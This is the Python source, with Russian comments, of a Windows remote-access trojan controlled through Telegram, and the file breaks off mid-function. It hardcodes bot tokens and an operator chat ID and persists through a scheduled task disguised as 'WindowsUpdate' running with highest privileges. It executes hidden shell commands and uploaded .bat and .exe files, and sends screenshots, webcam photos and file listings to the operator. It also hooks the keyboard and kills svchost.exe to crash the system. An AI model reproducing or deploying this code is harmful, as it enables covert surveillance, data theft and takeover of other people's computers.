import telebot
import os
import psutil
import platform
import requests
import datetime
import winreg
import ctypes
import time
import cv2
import tkinter as tk
import customtkinter as ctk
from telebot import types
from PIL import Image, ImageTk
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from mss import mss
import pyautogui
import numpy as np
import wmi
import threading
import subprocess
import random
import traceback
import win32gui
import win32con
import win32api
import pyttsx3
import urllib.request
import sys
import pythoncom
from win10toast import ToastNotifier
import keyboard
import winsound

# Настройка бота
LOG_BOT_TOKEN = "7278721633:AAHT480CiCEe_Z5dfcY1UezGtYvM_MPtnvg"  # Токен бота для логов
log_bot = telebot.TeleBot(LOG_BOT_TOKEN)
PC_USERNAME = os.getlogin()  # Имя пользователя ПК
bot_token = "7842654231:AAHTQ5BoPsSyKIyhqbulpRNXE_zukRJd9lQ"
my_id = 5109649592
bot = telebot.TeleBot(bot_token)

# Глобальные переменные
current_folder = None
blocked_apps = set()
last_screenshot = None
mouse_sensitivity = 50
streaming = False
prank_active = False
prank_threads = []
chat_window = None
chat_active = False
overlay_window = None
sysinfo_running = False
input_blocked = False
block_windows_key = False
sound_playing = False


# Проверка ID пользователя
def check_id(message):
    return message.chat.id == my_id

# Проверка прав администратора
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def block_windows():
    global block_windows_key
    block_windows_key = True
    def on_windows_press(event):
        if block_windows_key and "windows" in event.name.lower() and event.event_type == keyboard.KEY_DOWN:
            # Мгновенно "нажимаем" клавишу Windows, чтобы отменить действие
            keyboard.press("windows")
            keyboard.release("windows")
            return False  # Блокируем дальнейшую обработку
        return True
    keyboard.hook(on_windows_press)

def unblock_windows():
    global block_windows_key
    block_windows_key = False
    keyboard.unhook_all()  # Удаляем все перехваты

# Обработка ошибок
def handle_error(e, context="Неизвестная операция"):
    error_msg = f"[{PC_USERNAME}] Ошибка в {context}: {str(e)}\n{traceback.format_exc()}"
    print(error_msg)
    with open("error_log.txt", "a", encoding="utf-8") as f:
        f.write(f"{error_msg}\n{'='*50}\n")
    try:
        log_bot.send_message(my_id, error_msg)
    except Exception as log_error:
        print(f"Не удалось отправить лог в бота: {log_error}")

# Создание задачи в Планировщике задач для автозапуска
def create_admin_task():
    try:
        task_name = "WindowsUpdate"
        script_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])
        script_path = script_path.replace('\\', '\\\\')
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "\\"{script_path}\\"" '
            f'/sc onlogon /rl highest /f'
        )
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            print("Задача в Планировщике задач создана.")
            return True
        else:
            stderr_output = result.stderr if result.stderr is not None else ""
            if "Access is denied" in stderr_output or "Отказано в доступе" in stderr_output:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 1)
                time.sleep(2)
                check_result = subprocess.run(
                    f'schtasks /query /tn "{task_name}"',
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='replace',
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if check_result.returncode == 0:
                    print("Задача создана с повышенными правами.")
                    return True
                else:
                    handle_error(f"Не удалось создать задачу после runas: {check_result.stderr}", "создании задачи с повышенными правами")
                    return False
            else:
                handle_error(f"Не удалось создать задачу: {stderr_output}", "создании задачи в Планировщике задач")
                return False
    except Exception as e:
        handle_error(e, "создании задачи автозапуска")
        return False

def check_and_create_task():
    while True:
        try:
            result = subprocess.run(
                'schtasks /query /tn "TelegramBotAdminTask"',
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='replace',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                print("Задача автозапуска не найдена. Пытаюсь создать...")
                if create_admin_task():
                    break
            else:
                print("Задача автозапуска уже существует.")
                break
        except Exception as e:
            handle_error(e, "проверке и создании задачи автозапуска")
        time.sleep(10)

# Создание блокирующего окна
def create_overlay():
    global overlay_window
    try:
        if overlay_window:
            win32gui.DestroyWindow(overlay_window)
        overlay_window = win32gui.CreateWindowEx(
            win32con.WS_EX_TOPMOST | win32con.WS_EX_TRANSPARENT,
            "STATIC", "Overlay", win32con.WS_POPUP,
            0, 0, win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1),
            0, 0, 0, None
        )
        win32gui.ShowWindow(overlay_window, win32con.SW_SHOW)
        win32gui.UpdateWindow(overlay_window)
    except Exception as e:
        handle_error(e, "создании блокирующего окна")

def destroy_overlay():
    global overlay_window
    try:
        if overlay_window:
            win32gui.DestroyWindow(overlay_window)
            overlay_window = None
    except Exception as e:
        handle_error(e, "уничтожении блокирующего окна")

# Главное меню
@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        if not check_id(message):
            bot.send_message(my_id, f"Кто-то (ID: {message.chat.id}) пытался запустить бота!")
            return
        username = os.getlogin()
        bot.send_message(my_id, f"Запущено {username}")
        show_main_menu(message)
    except Exception as e:
        handle_error(e, "запуске бота")

def show_main_menu(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📷 Скриншоты", "📹 Веб-камера", "🖱 Мышка")
        markup.add("📂 Файлы", "🖥 Система", "📺 Процессы")
        markup.add("🔧 Автозагрузка", "📩 Уведомления", "🔊 Громкость")
        markup.add("📡 Стриминг", "🎉 Веселье", "📜 Сценарии")
        markup.add("💬 Чат", "⚙️ Админ", "💥 BSOD")
        bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "отображении главного меню")

# Управление ПК
@bot.message_handler(func=lambda message: message.text == "Управление ПК")
def control_pc_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Выключить ПК", "Перезагрузить ПК", "Гибернация")
        markup.add("Выполнить команду", "Открыть ссылку", "Запустить .bat")
        markup.add("⬅️ Назад")
        bot.send_message(message.chat.id, "Управление ПК:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню управления ПК")

@bot.message_handler(func=lambda message: message.text in ["Выключить ПК", "Перезагрузить ПК", "Гибернация"])
def power_control(message):
    try:
        if not check_id(message):
            return
        action = message.text
        if action == "Выключить ПК":
            subprocess.run("shutdown /s /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "ПК выключается...")
        elif action == "Перезагрузить ПК":
            subprocess.run("shutdown /r /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "ПК перезагружается...")
        elif action == "Гибернация":
            subprocess.run("shutdown /h", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "ПК переходит в режим гибернации...")
    except Exception as e:
        handle_error(e, "управлении питанием ПК")

@bot.message_handler(func=lambda message: message.text == "Выполнить команду")
def execute_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправьте команду для выполнения (например, dir):")
        bot.register_next_step_handler(message, process_command)
    except Exception as e:
        handle_error(e, "подготовке выполнения команды")

def process_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout or result.stderr or "Команда выполнена, но вывода нет."
        bot.send_message(message.chat.id, f"Результат:\n{output[:4000]}")
    except Exception as e:
        handle_error(e, "выполнении команды")

@bot.message_handler(func=lambda message: message.text == "Открыть ссылку")
def open_link(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправьте URL для открытия (например, https://example.com):")
        bot.register_next_step_handler(message, process_link)
    except Exception as e:
        handle_error(e, "подготовке открытия ссылки")

def process_link(message):
    try:
        if not check_id(message):
            return
        url = message.text
        if not url.startswith("http"):
            url = "http://" + url
        subprocess.run(f'start {url}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"Ссылка {url} открыта.")
    except Exception as e:
        handle_error(e, "открытии ссылки")

@bot.message_handler(content_types=['document'], func=lambda message: message.document.file_name.endswith(".bat"))
def handle_bat_file(message):
    try:
        if not check_id(message):
            return
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bat_path = f"temp_{message.document.file_name}"
        with open(bat_path, "wb") as f:
            f.write(downloaded_file)
        subprocess.run(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"Файл {message.document.file_name} запущен скрытно.")
        os.remove(bat_path)
    except Exception as e:
        handle_error(e, "запуске .bat файла")

# Админ меню
@bot.message_handler(func=lambda message: message.text == "⚙️ Админ")
def admin_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("🔄 Перезапуск", "🔄 Обновить бота")
        markup.add("Выключить ПК", "Перезагрузить ПК")
        markup.add("Скрытая команда", "Обычная команда", "Открыть ссылку")
        markup.add("Назад")
        bot.send_message(message.chat.id, "Админ меню:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню админа")

@bot.message_handler(func=lambda message: message.text == "Выключить ПК")
def shutdown_pc(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Да", callback_data="shutdown_yes"))
        markup.add(types.InlineKeyboardButton("Нет", callback_data="shutdown_no"))
        bot.send_message(message.chat.id, "Вы уверены, что хотите выключить ПК?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "выключении ПК")

@bot.message_handler(func=lambda message: message.text == "Перезагрузить ПК")
def reboot_pc(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Да", callback_data="reboot_yes"))
        markup.add(types.InlineKeyboardButton("Нет", callback_data="reboot_no"))
        bot.send_message(message.chat.id, "Вы уверены, что хотите перезагрузить ПК?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "перезагрузке ПК")

@bot.message_handler(func=lambda message: message.text == "Скрытая команда")
def hidden_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправьте команду для скрытого выполнения (например, dir):")
        bot.register_next_step_handler(message, process_hidden_command)
    except Exception as e:
        handle_error(e, "подготовке скрытой команды")

def process_hidden_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "Команда выполнена скрытно.")
    except Exception as e:
        handle_error(e, "выполнении скрытой команды")

@bot.message_handler(func=lambda message: message.text == "Обычная команда")
def normal_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправьте команду для выполнения (например, dir):")
        bot.register_next_step_handler(message, process_normal_command)
    except Exception as e:
        handle_error(e, "подготовке обычной команды")

def process_normal_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        output = result.stdout or result.stderr or "Команда выполнена, но вывода нет."
        bot.send_message(message.chat.id, f"Результат:\n{output[:4000]}")
    except Exception as e:
        handle_error(e, "выполнении обычной команды")

@bot.message_handler(func=lambda message: message.text == "Открыть ссылку")
def open_link(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправьте URL для открытия (например, https://example.com):")
        bot.register_next_step_handler(message, process_link)
    except Exception as e:
        handle_error(e, "подготовке открытия ссылки")

def process_link(message):
    try:
        if not check_id(message):
            return
        url = message.text
        if not url.startswith("http"):
            url = "http://" + url
        subprocess.run(f'start {url}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"Ссылка {url} открыта.")
    except Exception as e:
        handle_error(e, "открытии ссылки")

@bot.message_handler(func=lambda message: message.text == "🔄 Перезапуск")
def restart_bot(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Да", callback_data="restart_yes"))
        markup.add(types.InlineKeyboardButton("Нет", callback_data="restart_no"))
        bot.send_message(message.chat.id, "Вы уверены, что хотите перезапустить бота?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "перезапуске бота")

@bot.message_handler(func=lambda message: message.text == "🔄 Обновить бота")
def update_bot(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Да", callback_data="update_yes"))
        markup.add(types.InlineKeyboardButton("Нет", callback_data="update_no"))
        bot.send_message(message.chat.id, "Вы уверены, что хотите обновить бота? Отправьте новый .exe файл после подтверждения.", reply_markup=markup)
    except Exception as e:
        handle_error(e, "обновлении бота")

@bot.callback_query_handler(func=lambda call: call.data in ["restart_yes", "restart_no", "update_yes", "update_no"])
def confirm_action(call):
    try:
        if call.data == "restart_yes":
            bot.send_message(call.message.chat.id, "Перезапуск бота...")
            print(f"Перезапуск: sys.executable={sys.executable}, argv[0]={sys.argv[0]}")
            subprocess.Popen([sys.executable, sys.argv[0]])
            time.sleep(1)
            os._exit(0)
        elif call.data == "restart_no":
            bot.send_message(call.message.chat.id, "Перезапуск отменён")
            bot.answer_callback_query(call.id)
        elif call.data == "update_yes":
            bot.send_message(call.message.chat.id, "Пожалуйста, отправьте новый .exe файл для обновления бота.")
            bot.register_next_step_handler(call.message, process_update_file)
        elif call.data == "update_no":
            bot.send_message(call.message.chat.id, "Обновление отменено")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "подтверждении действия")

def process_update_file(message):
    try:
        if not check_id(message) or not message.document or not message.document.file_name.endswith(".exe"):
            bot.send_message(message.chat.id, "Пожалуйста, отправьте действительный .exe файл.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        new_exe_path = os.path.join("C:\\Windows", message.document.file_name)

        with open(new_exe_path, "wb") as f:
            f.write(downloaded_file)

        subprocess.run('schtasks /delete /tn "TelegramBotAdminTask" /f', shell=True, capture_output=True, text=True)
        cmd = (
            f'schtasks /create /tn "TelegramBotAdminTask" /tr "\\"{new_exe_path}\\"" '
            f'/sc onlogon /rl highest /f'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Ошибка создания задачи: {result.stderr}")

        bot.send_message(message.chat.id, f"Новая версия зарегистрирована: {new_exe_path}. Запускаю...")
        result = subprocess.run('schtasks /run /tn "TelegramBotAdminTask"', shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Ошибка запуска задачи: {result.stderr}")

        bot.send_message(message.chat.id, "Текущая версия завершает работу.")
        time.sleep(1)
        os._exit(0)

    except Exception as e:
        handle_error(e, "обработке файла обновления")
        bot.send_message(message.chat.id, "Ошибка при обновлении бота. Проверьте лог.")





@bot.callback_query_handler(func=lambda call: call.data in ["shutdown_yes", "shutdown_no", "reboot_yes", "reboot_no"])
def confirm_power_action(call):
    try:
        if call.data == "shutdown_yes":
            bot.send_message(call.message.chat.id, "ПК выключается...")
            subprocess.run("shutdown /s /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.answer_callback_query(call.id)
        elif call.data == "shutdown_no":
            bot.send_message(call.message.chat.id, "Выключение отменено")
            bot.answer_callback_query(call.id)
        elif call.data == "reboot_yes":
            bot.send_message(call.message.chat.id, "ПК перезагружается...")
            subprocess.run("shutdown /r /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.answer_callback_query(call.id)
        elif call.data == "reboot_no":
            bot.send_message(call.message.chat.id, "Перезагрузка отменена")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "подтверждении действия питания")

# BSOD
@bot.message_handler(func=lambda message: message.text == "💥 BSOD")
def bsod_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Вызвать BSOD", callback_data="bsod_yes"))
        markup.add(types.InlineKeyboardButton("Отмена", callback_data="bsod_no"))
        bot.send_message(message.chat.id, "Вы уверены, что хотите вызвать BSOD? Это перезагрузит систему!", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню BSOD")

@bot.callback_query_handler(func=lambda call: call.data in ["bsod_yes", "bsod_no"])
def trigger_bsod(call):
    try:
        if call.data == "bsod_yes":
            if not is_admin():
                bot.send_message(call.message.chat.id, "Требуются права администратора для вызова BSOD.")
                return
            bot.send_message(call.message.chat.id, "Вызываю BSOD через 5 секунд...")
            time.sleep(5)
            subprocess.run("taskkill /F /IM svchost.exe", shell=True, capture_output=True, text=True)
            bot.answer_callback_query(call.id, "BSOD вызван")
        elif call.data == "bsod_no":
            bot.send_message(call.message.chat.id, "BSOD отменён")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "вызове BSOD")

# Скриншоты
@bot.message_handler(func=lambda message: message.text == "📷 Скриншоты")
def screenshots_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📷 Быстрый скриншот", "🖼 Полный скриншот", "Назад")
        bot.send_message(message.chat.id, "Скриншоты:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню скриншотов")

@bot.message_handler(func=lambda message: message.text == "📷 Быстрый скриншот")
def quick_screenshot(message):
    try:
        if not check_id(message):
            return
        with mss() as sct:
            sct.shot(output="screenshot.png")
        with open("screenshot.png", "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove("screenshot.png")
    except Exception as e:
        handle_error(e, "быстром скриншоте")

@bot.message_handler(func=lambda message: message.text == "🖼 Полный скриншот")
def full_screenshot(message):
    try:
        if not check_id(message):
            return
        with mss() as sct:
            sct.shot(output="full_screenshot.png")
        with open("full_screenshot.png", "rb") as photo:
            bot.send_document(message.chat.id, photo)
        os.remove("full_screenshot.png")
    except Exception as e:
        handle_error(e, "полном скриншоте")

# Веб-камера
@bot.message_handler(func=lambda message: message.text == "📹 Веб-камера")
def webcam_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        index = 0
        while True:
            cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                break
            markup.add(types.InlineKeyboardButton(f"Камера {index}", callback_data=f"webcam:{index}"))
            cap.release()
            index += 1
        if index == 0:
            bot.send_message(message.chat.id, "Камеры не найдены")
            return
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:main"))
        bot.send_message(message.chat.id, "Выберите камеру:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню веб-камеры")

@bot.callback_query_handler(func=lambda call: call.data.startswith("webcam:"))
def webcam_photo(call):
    try:
        cam_index = int(call.data.split(":", 1)[1])
        cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
            with open("webcam.jpg", "rb") as photo:
                bot.send_photo(call.message.chat.id, photo)
            os.remove("webcam.jpg")
        else:
            bot.send_message(call.message.chat.id, "Ошибка: камера недоступна")
        cap.release()
        bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "съёмке с веб-камеры")

# Управление мышкой
@bot.message_handler(func=lambda message: message.text == "🖱 Мышка")
def mouse_control(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Влево", callback_data="mouse:left"))
        markup.add(types.InlineKeyboardButton("Вправо", callback_data="mouse:right"))
        markup.add(types.InlineKeyboardButton("Вверх", callback_data="mouse:up"))
        markup.add(types.InlineKeyboardButton("Вниз", callback_data="mouse:down"))
        markup.add(types.InlineKeyboardButton("ЛКМ", callback_data="mouse:lclick"))
        markup.add(types.InlineKeyboardButton("ПКМ", callback_data="mouse:rclick"))
        markup.add(types.InlineKeyboardButton("Чувствительность", callback_data="mouse:sensitivity"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:main"))
        bot.send_message(message.chat.id, "Управление мышкой:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню управления мышкой")

@bot.callback_query_handler(func=lambda call: call.data.startswith("mouse:"))
def mouse_callback(call):
    try:
        global last_screenshot, mouse_sensitivity
        action = call.data.split(":", 1)[1]
        if action == "lclick":
            pyautogui.click(button='left')
            bot.answer_callback_query(call.id, "ЛКМ выполнен")
        elif action == "rclick":
            pyautogui.click(button='right')
            bot.answer_callback_query(call.id, "ПКМ выполнен")
        elif action == "left":
            pyautogui.moveRel(-mouse_sensitivity, 0)
            bot.answer_callback_query(call.id, "Движение влево")
        elif action == "right":
            pyautogui.moveRel(mouse_sensitivity, 0)
            bot.answer_callback_query(call.id, "Движение вправо")
        elif action == "up":
            pyautogui.moveRel(0, -mouse_sensitivity)
            bot.answer_callback_query(call.id, "Движение вверх")
        elif action == "down":
            pyautogui.moveRel(0, mouse_sensitivity)
            bot.answer_callback_query(call.id, "Движение вниз")
        elif action == "sensitivity":
            bot.send_message(call.message.chat.id, "Введи чувствительность (10-200):")
            bot.register_next_step_handler(call.message, set_sensitivity)
            return
        screenshot_path = "mouse_screenshot.png"
        with mss() as sct:
            sct.shot(output=screenshot_path)
        with open(screenshot_path, "rb") as photo:
            if last_screenshot:
                bot.delete_message(call.message.chat.id, last_screenshot)
            last_screenshot = bot.send_photo(call.message.chat.id, photo).message_id
        os.remove(screenshot_path)
    except Exception as e:
        handle_error(e, "управлении мышкой")

def set_sensitivity(message):
    try:
        global mouse_sensitivity
        sens = int(message.text)
        if 10 <= sens <= 200:
            mouse_sensitivity = sens
            bot.send_message(message.chat.id, f"Чувствительность установлена: {sens}")
        else:
            bot.send_message(message.chat.id, "Введите число от 10 до 200")
    except Exception as e:
        handle_error(e, "установке чувствительности мыши")

# Файлы
def get_file_icon(file_path):
    try:
        if os.path.isdir(file_path):
            return "📁"
        ext = os.path.splitext(file_path)[1].lower()
        icons = {
            ".txt": "📝",
            ".doc": "📜", ".docx": "📜",
            ".pdf": "📕",
            ".exe": "⚙️",
            ".jpg": "🖼️", ".png": "🖼️", ".jpeg": "🖼️",
            ".mp4": "🎥", ".avi": "🎥",
            ".mp3": "🎵", ".wav": "🎵",
            ".zip": "📦", ".rar": "📦",
            ".py": "🐍",
            ".bat": "💾",
        }
        return icons.get(ext, "📃")
    except Exception as e:
        handle_error(e, "определении иконки файла")
        return "📃"

@bot.message_handler(content_types=['document'], func=lambda message: not message.document.file_name.endswith(".bat"))
def upload_file(message):
    try:
        if not check_id(message):
            return
        global current_folder
        if current_folder and os.path.isdir(current_folder):
            bot.send_message(message.chat.id, f"Загрузить файл в текущую папку '{current_folder}'?\nОтправь 'да' или укажи другой путь (например, C:\\Downloads):")
        else:
            bot.send_message(message.chat.id, "Отправь путь для сохранения (например, C:\\Downloads):")
        bot.register_next_step_handler(message, lambda msg: save_file(msg, message.document))
    except Exception as e:
        handle_error(e, "загрузке файла")

def save_file(message, document):
    try:
        global current_folder
        path = message.text
        if path.lower() == "да" and current_folder and os.path.isdir(current_folder):
            path = current_folder
        else:
            if not os.path.exists(path):
                os.makedirs(path)
        file_info = bot.get_file(document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        save_path = os.path.join(path, document.file_name)
        with open(save_path, "wb") as f:
            f.write(downloaded_file)
        bot.send_message(message.chat.id, f"📥 Файл сохранён в {save_path}")
    except Exception as e:
        handle_error(e, "сохранении файла")

def create_folder_keyboard(path, page=0, per_page=10):
    try:
        markup = types.InlineKeyboardMarkup()
        items = sorted(os.listdir(path))
        total_pages = (len(items) + per_page - 1) // per_page
        start = page * per_page
        end = min(start + per_page, len(items))

        for item in items[start:end]:
            item_path = os.path.join(path, item)
            icon = get_file_icon(item_path)
            callback = f"folder:{page}:{item_path}" if os.path.isdir(item_path) else f"file:{item_path}"
            markup.add(types.InlineKeyboardButton(f"{icon} {item}", callback_data=callback))

        nav_buttons = []
        if page > 0:
            nav_buttons.append(types.InlineKeyboardButton("⬅️ Назад", callback_data=f"folder:{page-1}:{path}"))
        if page < total_pages - 1:
            nav_buttons.append(types.InlineKeyboardButton("Вперёд ➡️", callback_data=f"folder:{page+1}:{path}"))
        if nav_buttons:
            markup.row(*nav_buttons)

        parent_dir = os.path.dirname(path)
        if parent_dir != path:
            markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data=f"folder:0:{parent_dir}"))
        else:
            markup.add(types.InlineKeyboardButton("⬅️ К дискам", callback_data="drives"))

        return markup
    except Exception as e:
        handle_error(e, "создании клавиатуры папки")
        return types.InlineKeyboardMarkup()

@bot.message_handler(func=lambda message: message.text == "📂 Файлы")
def files_command(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            markup.add(types.InlineKeyboardButton(drive, callback_data=f"folder:0:{drive}"))
        markup.add(types.InlineKeyboardButton("🔍 Поиск файлов", callback_data="search_files"))
        markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="back:main"))
        bot.send_message(message.chat.id, "Выберите диск:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню файлов")

@bot.callback_query_handler(func=lambda call: call.data.startswith("folder:"))
def folder_callback(call):
    try:
        global current_folder
        parts = call.data.split(":", 2)
        page = int(parts[1])
        path = parts[2]
        current_folder = path
        markup = create_folder_keyboard(path, page)
        markup.add(types.InlineKeyboardButton("📥 Загрузить файл в папку", callback_data=f"upload_to_folder:{path}"))
        markup.add(types.InlineKeyboardButton("🔍 Поиск файлов", callback_data=f"search_files_in_folder:{path}"))
        bot.edit_message_text(f"📁 Папка {os.path.basename(path) or path}:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "открытии папки")

@bot.callback_query_handler(func=lambda call: call.data == "search_files")
def search_files_prompt(call):
    try:
        bot.answer_callback_query(call.id, "Введите запрос для поиска")
        bot.send_message(call.message.chat.id, "Введите имя файла или его часть для поиска (например, 'photo' для поиска файлов, содержащих 'photo'):")
        bot.register_next_step_handler(call.message, search_files_in_system)
    except Exception as e:
        handle_error(e, "подготовке поиска файлов")

@bot.callback_query_handler(func=lambda call: call.data.startswith("search_files_in_folder:"))
def search_files_in_folder_prompt(call):
    try:
        folder_path = call.data.split(":", 1)[1]
        if not os.path.isdir(folder_path):
            bot.answer_callback_query(call.id, "Ошибка: папка больше не существует")
            return
        bot.answer_callback_query(call.id, "Введите запрос для поиска")
        bot.send_message(call.message.chat.id, f"Введите имя файла или его часть для поиска в '{folder_path}' (например, 'photo'):")
        bot.register_next_step_handler(call.message, lambda msg: search_files_in_folder(msg, folder_path))
    except Exception as e:
        handle_error(e, "подготовке поиска файлов в папке")

def search_files_in_system(message):
    try:
        if not check_id(message):
            return
        query = message.text.lower()
        bot.send_message(message.chat.id, "Поиск начат, это может занять некоторое время...")
        
        def perform_search():
            found_files = []
            drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
            for drive in drives:
                for root, _, files in os.walk(drive, topdown=True):
                    try:
                        for file in files:
                            if query in file.lower():
                                file_path = os.path.join(root, file)
                                found_files.append(file_path)
                                if len(found_files) >= 10:  # Ограничим 10 результатами
                                    break
                    except:
                        continue
                    if len(found_files) >= 10:
                        break
                if len(found_files) >= 10:
                    break
            
            if found_files:
                markup = types.InlineKeyboardMarkup()
                for file_path in found_files:
                    icon = get_file_icon(file_path)
                    markup.add(types.InlineKeyboardButton(f"{icon} {os.path.basename(file_path)}", callback_data=f"file:{file_path}"))
                markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="back:main"))
                bot.send_message(message.chat.id, "Найденные файлы:", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, "Файлы не найдены.")
        
        threading.Thread(target=perform_search, daemon=True).start()
    except Exception as e:
        handle_error(e, "поиске файлов в системе")

def search_files_in_folder(message, folder_path):
    try:
        if not check_id(message):
            return
        query = message.text.lower()
        bot.send_message(message.chat.id, f"Поиск файлов в '{folder_path}' начат...")
        
        def perform_search():
            found_files = []
            for root, _, files in os.walk(folder_path, topdown=True):
                try:
                    for file in files:
                        if query in file.lower():
                            file_path = os.path.join(root, file)
                            found_files.append(file_path)
                            if len(found_files) >= 10:  # Ограничим 10 результатами
                                break
                except:
                    continue
                if len(found_files) >= 10:
                    break
            
            if found_files:
                markup = types.InlineKeyboardMarkup()
                for file_path in found_files:
                    icon = get_file_icon(file_path)
                    markup.add(types.InlineKeyboardButton(f"{icon} {os.path.basename(file_path)}", callback_data=f"file:{file_path}"))
                markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data=f"folder:0:{folder_path}"))
                bot.send_message(message.chat.id, "Найденные файлы:", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, "Файлы не найдены.")
        
        threading.Thread(target=perform_search, daemon=True).start()
    except Exception as e:
        handle_error(e, "поиске файлов в папке")

@bot.callback_query_handler(func=lambda call: call.data.startswith("upload_to_folder:"))
def upload_to_folder_callback(call):
    try:
        if not check_id(call.message):
            return
        path = call.data.split(":", 1)[1]
        if not os.path.isdir(path):
            bot.answer_callback_query(call.id, "Ошибка: папка больше не существует")
            return
